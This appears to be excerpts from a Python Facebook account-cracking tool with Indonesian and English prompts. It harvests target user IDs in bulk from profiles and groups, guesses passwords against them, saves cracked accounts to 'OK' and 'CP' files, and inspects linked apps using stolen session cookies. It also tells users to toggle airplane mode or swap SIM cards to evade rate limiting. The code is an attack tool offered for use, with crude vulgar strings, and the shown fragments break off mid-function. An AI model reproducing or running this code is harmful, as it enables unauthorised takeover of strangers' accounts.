...
• GEHAH : http://github.com/Badshawazir•
• GROUP : @i6o211－@F9_X1 •
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'└──> 1. Results {h}OK{x} Ɑ͞ ̶͞ ̶͞ ඩ ')
	print(f'└──> 2. Results {k}CP{x} Ɑ͞ ̶͞ ̶͞ ඩ ')
	print('└──> 3. Return	')
	kz = input(f'\n>> Pilih : ')
	if kz in ['2']:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('How many targets ids ? : '))
	except ValueError:
		print('>> Enter ids Number, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
	...
	for met in range(jum):
		yz+=1
		kl = input('|Enter id ??That is to : '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
...
def grup():
	...
	if berr2=='Enter id Facebook':
		print(" Caught Limit, Please Trun On Airplane Mode And Try Again..")
		time.sleep(0.5)
		grup()
	elif berr2=='Error':
...
def grup1(urls):
	use = []
	ses = requests.Session()
	print(f'{x}>> Currently Collecting Idz ')
	print(f'>> Klik {k}Ctrl+C{x} Enter {m}Stop{x} Dump !!')
	while True:
		try:
			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
			miskinlu = {"user-agent": ua}
...
def crack_file():
	...
	if len(vin)==0:
		print('')
		cetak(nel('[white][[cyan]•[white]] If you want to use this feature follow the conditions below\n[[green]1[white]] make it File Dump Id First\n[[green]2[white]] After So Enter the File Into the Folder[yellow] ALVINO-DUMP[white] in your Internal Storage\n[[green]3[white]] Then Rerun the Script! New Select Number Feature[yellow] 4 [white]ini '))
		kontol = input('\n>> Do you understand ( Y/t ) ')
		if kontol in ['']:
			print('>> Choose the Right One ')
		elif kontol in ['y','Y']:
			print(f'\n[{h}√{x}] Alhamdulillah You Are Really Smart ')
			time.sleep(3)
			back()
		elif kontol in ['t','T']:
...
def setting():
	...
	if hc in ['1','01']:
		...
		method.append('validate')
	print('')
	_jembot_ = input('|Want to Show Apk??𝐬𝐢 (Not Recommend) [Y/t] : ')
	if _jembot_ in ['']:
		print('>> Choose the Right One ')
		back()
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Enter the Minimum Additional Password 6 Character\n[[cyan]•[white]] Example :[green] khan,kontol,sayang[white] '))
...
def passwrd():
	...
	banner()
	print('')
	print(f'|Result {h}OK{x} Ɑ͞ ̶͞ ̶͞ ඩSaved In : {h}OK/%s {x}'%(okc))
	print(f'|Result {k}OK{x} Ɑ͞ ̶͞ ̶͞ ඩSaved In : {k}CP/%s {x}'%(cpc))
	print(f'| play ??Ɑ͞ ̶͞ ̶͞ ඩ ??Airplane {m}200{x} Id\n')
...
def cek_opsi():
	c = len(akun)
	hu = 'There is %s Account To Check\nBefore Start, Mode Airplane/Change Sim Card First'%(c)
...
def cek_apk(session,cookie):
	...
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] opshh there are no expired applications in this account.")
	else:
		for i in range(len(game)):
